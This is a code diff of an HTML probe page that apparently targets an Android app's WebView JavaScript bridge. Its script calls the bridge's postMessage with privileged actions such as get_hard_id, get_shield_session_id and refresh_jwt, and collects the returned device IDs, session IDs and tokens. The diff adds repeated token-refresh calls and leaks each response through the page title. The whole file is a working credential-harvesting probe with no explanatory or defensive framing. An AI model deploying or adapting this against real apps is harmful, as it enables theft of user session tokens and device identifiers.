@@ -1,16 +1,16 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ENUM-PROBE</title></head>
+<html><head><meta charset="utf-8"><title>ENUM4</title></head>
 <body style="background:#111;color:#0f0;font:12px monospace;padding:12px">
 <pre id="log">boot</pre>
 <div id="res" style="margin-top:8px;word-break:break-all;white-space:pre-wrap"></div>
 <script>
 const log = (s) => { document.getElementById('log').textContent += '\n' + s; };
 log('loaded ' + location.href);
-function showRes(obj) {
-  const s = (typeof obj === 'string') ? obj : JSON.stringify(obj);
-  document.getElementById('res').textContent += '<<< ' + s.slice(0, 600) + '\n';
-}
-window.callWebView = (o) => { log('callWebView fired'); showRes(o); };
+window.callWebView = (o) => {
+  const s = (typeof o === 'string') ? o : JSON.stringify(o);
+  document.getElementById('res').textContent += '<<< ' + s.slice(0, 800) + '\n';
+  try { document.title = 'R|' + s.replace(/\s+/g, ' ').slice(0, 140); } catch (e) {}
+};
 (function fire() {
   const A = window.Android;
   if (!A) { setTimeout(fire, 100); return; }
@@ -18,7 +18,17 @@ window.callWebView = (o) => { log('callWebView fired'); showRes(o); };
   const acts = ['get_hard_id', 'get_marketing_referral_link', 'get_shield_session_id', 'refresh_jwt'];
   let i = 0;
   const t = setInterval(() => {
-    if (i >= acts.length) { clearInterval(t); log('all sent, waiting'); return; }
+    if (i >= acts.length) {
+      clearInterval(t);
+      log('first pass done; retrying refresh_jwt');
+      let r = 0;
+      const t2 = setInterval(() => {
+        if (r >= 3) { clearInterval(t2); log('done'); return; }
+        try { A.postMessage('{"action":"refresh_jwt"}'); log('retry ' + (r+1)); } catch (e) { log('err: ' + e); }
+        r++;
+      }, 12000);
+      return;
+    }
     try { A.postMessage('{"action":"' + acts[i] + '"}'); log('sent ' + acts[i]); }
     catch (e) { log('err ' + acts[i] + ': ' + e); }
     i++;
